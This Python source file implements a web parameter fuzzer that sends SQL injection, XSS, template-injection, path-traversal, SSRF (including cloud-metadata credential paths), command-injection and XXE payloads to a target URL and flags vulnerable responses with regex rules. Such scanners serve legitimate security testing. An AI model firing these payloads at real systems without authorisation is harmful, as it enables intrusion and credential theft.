import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

PAYLOADS: dict[str, list[str]] = {

    "error_trigger": [
        "test", "'", "\"", "\\", "\x00", "--", ";",
        "{{7*7}}", "${7*7}", "<%=7*7%>",
    ],

    "sqli": [
        "'", "''", "`", "\"",
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
        "' AND SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; EXEC xp_cmdshell('whoami')--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "' OR SLEEP(3)#",
    ],

    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "';alert(1);//",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
    ],

    "ssti": [
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%=7*7%>",
        "#{7*7}", "${7*7}", "@(7*7)",
        "{{config}}", "{{self}}", "{{request}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "<%= system('id') %>",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],

    "path_traversal": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//etc/passwd", "..%2Fetc%2Fpasswd",
        "%2e%2e%2fetc%2fpasswd", "..%252fetc%252fpasswd",
        "/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "%c0%af%c0%af%c0%afetc/passwd",
    ],

    "ssrf": [
        "http://127.0.0.1", "http://localhost",
        "http://169.254.169.254",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "http://192.168.0.1", "http://10.0.0.1",
        "http://0.0.0.0", "http://[::1]",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
    ],

    "open_redirect": [
        "//evil.com", "///evil.com",
        "https://evil.com", "http://evil.com",
        "//evil.com/%2F..", "/%09/evil.com",
        "//google.com@evil.com",
        "\\/\\/evil.com", "/\\evil.com",
        "http://evil.com#.target.com",
        "https://evil.com?url=https://target.com",
    ],

    "command_injection": [
        "; id", "| id", "& id", "`id`", "$(id)",
        "; whoami", "| whoami", "; ls -la", "| cat /etc/passwd",
        "\n id", "\r\n id",
        "; sleep 3", "| sleep 3", "& sleep 3",
        "$(sleep 3)", "`sleep 3`",
        "1; ping -c 3 127.0.0.1",
    ],

    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ],

    "special_values": [
        "", "null", "undefined", "None", "true", "false",
        "0", "-1", "9999999999", "NaN", "Infinity",
        "[]", "{}", "[[]]",
        "A" * 1000,
        "%s%s%s%s%s",
        "%n%n%n%n",
        "\x00" * 10,
    ],
}

DETECTION_RULES: list[tuple[str, str, str]] = [
    ("sqli",     r"sql syntax|mysql_fetch|ORA-\d+|sqlite_|pg_query|syntax error.*sql|"
                 r"Microsoft OLE DB|ODBC SQL|Unclosed quotation|SQLiteException|"
                 r"com\.mysql\.jdbc|org\.postgresql|java\.sql\.",  "SQL Error"),
    ("sqli",     r"you have an error in your sql",                 "MySQL Error"),
    ("xss",      r"<script>alert\(1\)</script>",                   "XSS Reflected"),
    ("xss",      r"onerror=alert\(1\)|onload=alert\(1\)",         "XSS Attribute"),
    ("ssti",     r"^49$|^49\s",                                    "SSTI {{7*7}}=49"),
    ("ssti",      r"7777777",                                       "SSTI {{7*'7'}}"),
    ("path",     r"root:.*:/bin/|/etc/passwd",                     "LFI /etc/passwd"),
    ("path",     r"\[boot loader\]|\\[extensions\\]",              "LFI Windows"),
    ("ssrf",     r"ami-id|instance-id|iam.*security|169\.254",     "SSRF AWS Metadata"),
    ("ssrf",     r"computeMetadata|metadata\.google",              "SSRF GCP Metadata"),
    ("cmd",      r"uid=\d+|root:\d+|www-data",                    "Command Injection"),
    ("cmd",      r"Volume Serial Number|Directory of C:\\",        "Windows CMD"),
    ("error",    r"traceback|stack.?trace|exception|at\s+\w+\.java|\w+Exception",
                 "Stack Trace"),
    ("error",    r"\"debug\"\s*:\s*true|debug.?mode",             "Debug Mode"),
    ("error",    r"internal server error",                         "500 ISE"),
    ("xxe",      r"root:.*:/bin/|<?xml|DOCTYPE",                  "XXE"),
    ("redirect", r"location:\s*https?://evil",                    "Open Redirect"),
]

@dataclass
class FuzzFinding:
    url:           str
    param:         str
    payload:       str
    category:      str
    issue:         str
    status:        int
    response_time: float
    evidence:      str         = ""
    severity:      str         = "medium"
    baseline_diff: bool        = False

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class FuzzReport:
    url:           str
    started_at:    str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at:   Optional[str]  = None
    params_tested: list[str]      = field(default_factory=list)
    total_requests:int            = 0
    findings:      list[FuzzFinding] = field(default_factory=list)
    errors:        list[str]      = field(default_factory=list)

    @property
    def critical(self) -> list[FuzzFinding]:
        return [f for f in self.findings if f.severity == "critical"]

    @property
    def high(self) -> list[FuzzFinding]:
        return [f for f in self.findings if f.severity == "high"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d

SEVERITY_MAP: dict[str, str] = {
    "SQL Error":          "critical",
    "MySQL Error":        "critical",
    "XSS Reflected":      "high",
    "XSS Attribute":      "high",
    "SSTI {{7*7}}=49":    "critical",
    "SSTI {{7*'7'}}":     "critical",
    "LFI /etc/passwd":    "critical",
    "LFI Windows":        "critical",
    "SSRF AWS Metadata":  "critical",
    "SSRF GCP Metadata":  "critical",
    "Command Injection":  "critical",
    "Windows CMD":        "critical",
    "Stack Trace":        "medium",
    "Debug Mode":         "medium",
    "500 ISE":            "low",
    "XXE":                "critical",
    "Open Redirect":      "medium",
}

async def _get_baseline(
    client: httpx.AsyncClient,
    url:    str,
    param:  str,
) -> tuple[int, str, float]:
    """Faz request limpo para ter baseline de comparação."""
    try:
        t0 = time.perf_counter()
        r  = await client.get(url, params={param: "baseline_prothos_xyz"}, timeout=10)
        return r.status_code, r.text[:500], round(time.perf_counter() - t0, 3)
    except Exception:
        return 0, "", 0.0


def _detect(
    body:     str,
    status:   int,
    headers:  dict,
    category: str,
    payload:  str,
    baseline_status: int,
    baseline_body:   str,
    elapsed:  float,
) -> list[tuple[str, str, str]]:
    
    findings = []
    body_lower = body[:10000]

    for cat, pattern, label in DETECTION_RULES:
        if re.search(pattern, body_lower, re.IGNORECASE):
            evidence = re.search(pattern, body_lower, re.IGNORECASE)
            evidence_str = evidence.group(0)[:100] if evidence else ""
            severity = SEVERITY_MAP.get(label, "medium")
            findings.append((label, evidence_str, severity))

    if elapsed > 3.0 and category in ("sqli", "command_injection"):
        findings.append((
            f"Time-based ({elapsed:.1f}s)",
            f"Response took {elapsed:.1f}s with payload: {payload[:40]}",
            "high",
        ))

    if baseline_status and status != baseline_status:
        findings.append((
            f"Status change {baseline_status}→{status}",
            f"Payload changed response from {baseline_status} to {status}",
            "low",
        ))

    if status == 500 and not any(f[0] == "500 ISE" for f in findings):
        findings.append(("500 ISE", f"Server error with payload: {payload[:40]}", "low"))

    return findings


async def _fuzz_param(
    client:   httpx.AsyncClient,
    url:      str,
    param:    str,
    payloads: dict[str, list[str]],
    sem:      asyncio.Semaphore,
    delay:    float,
) -> list[FuzzFinding]:

    findings: list[FuzzFinding] = []

    b_status, b_body, _ = await _get_baseline(client, url, param)

    async with sem:
        for category, payload_list in payloads.items():
            for payload in payload_list:
                try:
                    if delay:
                        await asyncio.sleep(delay)

                    t0 = time.perf_counter()
                    r  = await client.get(
                        url,
                        params={param: payload},
                        timeout=12,
                    )
                    elapsed = round(time.perf_counter() - t0, 3)

                    headers_lower = {k.lower(): v for k, v in r.headers.items()}
                    detected = _detect(
                        r.text, r.status_code, headers_lower,
                        category, payload, b_status, b_body, elapsed,
                    )

                    for issue, evidence, severity in detected:
                        f = FuzzFinding(
                            url=url,
                            param=param,
                            payload=payload[:100],
                            category=category,
                            issue=issue,
                            status=r.status_code,
                            response_time=elapsed,
                            evidence=evidence[:200],
                            severity=severity,
                            baseline_diff=(r.status_code != b_status),
                        )
                        findings.append(f)
                        _print_finding(f)

                except httpx.TimeoutException:
                    findings.append(FuzzFinding(
                        url=url, param=param, payload=payload[:100],
                        category=category, issue="Timeout (possible blind)",
                        status=0, response_time=12.0, severity="medium",
                    ))
                except Exception:
                    pass

    return findings


async def _fuzz_async(
    url:         str,
    params:      list[str],
    categories:  list[str],
    concurrency: int,
    delay:       float,
    proxy:       Optional[str],
) -> FuzzReport:

    report  = FuzzReport(url=url, params_tested=params)
    proxies = {"http://": proxy, "https://": proxy} if proxy else None
    sem     = asyncio.Semaphore(concurrency)

    active_payloads = {k: v for k, v in PAYLOADS.items() if k in categories}
    total = len(params) * sum(len(v) for v in active_payloads.values())
    report.total_requests = total

    console.print(f"[dim]    Params: {len(params)}  "
                  f"Categories: {', '.join(categories)}  "
                  f"Total requests: ~{total}[/dim]\n")

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=False,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
        proxies=proxies,
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TextColumn("[green]{task.completed}[/green]/[white]{task.total}[/white]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Fuzzing params...", total=len(params))

            tasks = [
                _fuzz_param(client, url, param, active_payloads, sem, delay)
                for param in params
            ]

            for coro in asyncio.as_completed(tasks):
                results = await coro
                report.findings.extend(results)
                progress.advance(task_id, 1)

    report.findings.sort(key=lambda x: (
        {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x.severity, 4)
    ))
    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
}


def _print_finding(f: FuzzFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.param}[/bold white] → "
        f"[yellow]{f.issue}[/yellow]  "
        f"[dim]payload: {f.payload[:40]}[/dim]"
    )


def _display_summary(report: FuzzReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.url}[/bold white]\n"
        f"[dim]params:[/dim] {len(report.params_tested)}  "
        f"[dim]requests:[/dim] {report.total_requests}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]critical:[/dim] [red]{len(report.critical)}[/red]  "
        f"[dim]high:[/dim] [red]{len(report.high)}[/red]",
        title="[bold red]Parameter Fuzzer — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]  No findings.[/dim]")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  style="bold",       width=10)
    table.add_column("Param",     style="bold white",  width=20)
    table.add_column("Category",  style="cyan",        width=15)
    table.add_column("Issue",     style="yellow",      min_width=25)
    table.add_column("Status",    style="dim",          width=7)
    table.add_column("Time",      style="dim",          width=7)
    table.add_column("Payload",   style="dim",          min_width=25)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.param,
            f.category,
            f.issue,
            str(f.status) if f.status else "-",
            f"{f.response_time}s",
            f.payload[:40],
        )

    console.print(table)

    if report.critical:
        console.print(f"\n[bold red][!] CRITICAL: {len(report.critical)} finding(s)[/bold red]")
        for f in report.critical:
            console.print(f"    [red]→[/red] [bold]{f.param}[/bold] — {f.issue}")
            if f.evidence:
                console.print(f"       [dim]evidence: {f.evidence[:100]}[/dim]")

    console.print()

def fuzz_params(
    url:         str,
    params:      list[str],
    categories:  list[str]    = None,
    concurrency: int          = 10,
    delay:       float        = 0.0,
    proxy:       Optional[str]= None,
    save_json:   Optional[str]= None,
) -> FuzzReport:

    console.print(f"\n[bold red][*][/bold red] Parameter fuzzing → [bold white]{url}[/bold white]")

    active_cats = categories or list(PAYLOADS.keys())

    report = asyncio.run(_fuzz_async(
        url=url,
        params=params,
        categories=active_cats,
        concurrency=concurrency,
        delay=delay,
        proxy=proxy,
    ))

    _display_summary(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save JSON: {e}[/red]")

    return report